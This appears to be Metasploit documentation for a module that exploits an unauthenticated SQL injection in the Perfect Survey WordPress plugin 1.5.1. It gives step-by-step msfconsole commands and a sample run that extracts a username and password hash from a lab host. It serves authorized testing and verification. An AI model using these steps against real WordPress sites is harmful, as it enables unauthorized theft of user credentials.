## Vulnerable Application

Perfect Survey, a WordPress plugin, version 1.5.1 is affected by an unauthenticated SQL injection vulnerability
via the `question_id` parameter.

An unauthenticated attacker can exploit this SQL injection vulnerability to retrieve sensitive information,
such as usernames and password hashes, from the `wp_users` table.

The vulnerable plugin can be downloaded from the [WordPress plugin repository](https://wordpress.org/plugins/).
The specific vulnerable version can be found here: https://www.exploit-db.com/apps/51c80e6262c3a39fa852ebf96ff86b78-perfect-survey.1.5.1.zip

## Verification Steps

1. Install the WordPress application and the vulnerable version of the Perfect Survey plugin.
2. Start `msfconsole`.
3. Run: `use auxiliary/scanner/http/wp_perfect_survey_sqli`.
4. Set the target host: `set RHOSTS [ip]`.
5. Adjust other options as necessary, such as `TARGETURI` (default is `/`).
6. Execute the module: `run`.
7. The module should retrieve usernames and password hashes from the WordPress installation.

## Options

### SHOW_FULL_RESPONSE
If set to `true`, the module will print the entire JSON response received from the server when username and password hash extraction fails.
Default is `false`.

## Scenarios

### WordPress with Perfect Survey Plugin 1.5.1 on Ubuntu 20.04

#### Example

```sh
msf6 > use auxiliary/scanner/http/wp_perfect_survey_sqli
[*] Using auxiliary/scanner/http/wp_perfect_survey_sqli
msf6 auxiliary(scanner/http/wp_perfect_survey_sqli) > set RHOSTS 192.168.1.104
RHOSTS => 192.168.1.104
msf6 auxiliary(scanner/http/wp_perfect_survey_sqli) > set RPORT 8000
RPORT => 8000
msf6 auxiliary(scanner/http/wp_perfect_survey_sqli) > set TARGETURI /wordpress
TARGETURI => /wordpress
msf6 auxiliary(scanner/http/wp_perfect_survey_sqli) > exploit 
[*] Running module against 192.168.1.104

[*] Exploiting SQLi in Perfect Survey plugin...
[+] Received a response from the server!
[+] Extracted Username: aaryan
[+] Extracted Password Hash: $P$BroxbUQTM0N32U7JeMmkXPJrxN9ErZ1
[*] Auxiliary module execution completed
```
